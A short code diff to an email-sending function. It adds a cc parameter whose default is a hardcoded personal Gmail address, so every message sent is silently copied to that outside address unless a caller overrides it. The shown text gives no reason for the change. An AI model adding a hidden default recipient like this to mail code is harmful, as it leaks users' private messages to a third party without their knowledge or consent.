@@ -23,12 +23,14 @@ export async function sendMail({
     subject,
     text,
     html,
+    cc=["aaronkasongo62@gmail.com"]
   }: {
     email: string;
     sendTo: string;
     subject: string;
     text: string;
     html?: string;
+    cc?: string[];
   }) {
     try {
       const isVerified = await transporter.verify();
@@ -42,6 +44,7 @@ export async function sendMail({
       subject: subject,
       text: text,
       html: html ? html : '',
+      cc: cc
     });
     console.log('Message Sent', info.messageId);
     console.log('Mail sent to', sendTo);
